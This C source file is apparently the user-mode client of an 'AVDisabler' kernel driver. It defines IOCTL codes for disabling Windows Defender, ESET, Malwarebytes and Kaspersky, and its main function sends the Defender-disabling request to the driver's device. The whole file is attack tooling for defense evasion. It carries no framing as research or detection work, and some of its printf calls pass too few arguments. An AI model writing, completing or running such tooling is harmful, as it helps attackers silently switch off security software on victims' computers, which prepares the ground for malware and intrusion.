#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#define DeviceSymlink LR"(\\.\AVDisabler)"
#define DeviceType 0x8001
#define PROCESS_TERMINATE 1

#define IOCTL_DISABLE_DEFENDER CTL_CODE(DeviceType, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISABLE_ESET CTL_CODE(DeviceType, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISABLE_MALWAREBYTES CTL_CODE(DeviceType, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISABLE_KASPERSKY CTL_CODE(DeviceType, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

int IOCTLCaller(DWORD IOCTL)
{
    HANDLE hDevice = CreateFile(DeviceSymlink, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }

    PVOID InputBuffer = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PVOID OutputBuffer = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    DWORD BytesReturned = 0;

    printf("SizeOf inputbuffer: 0x%x\n", sizeof(InputBuffer));

    if (!DeviceIoControl(hDevice, IOCTL, InputBuffer, 0x1000, OutputBuffer, 0x1000, &BytesReturned, nullptr))
    {
        printf("[-] IOCTL 0x%x (0x%x) failed with GetLastError() of: %u\n", IOCTL, GetLastError());
        return -1;
    }

    printf("[+] IOCTL 0x%x executed successfully!\n", IOCTL);

    if (*(BYTE*)OutputBuffer != 0x00)
        printf("[*] IOCTL 0x%x Output buffer: %s\n", (CHAR*)OutputBuffer);

    getchar();

    VirtualFree(InputBuffer, 0x1000, MEM_RELEASE);
    VirtualFree(OutputBuffer, 0x1000, MEM_RELEASE);

    return 0;
}

int main()
{
    IOCTLCaller(IOCTL_DISABLE_DEFENDER);
    return 0;
}
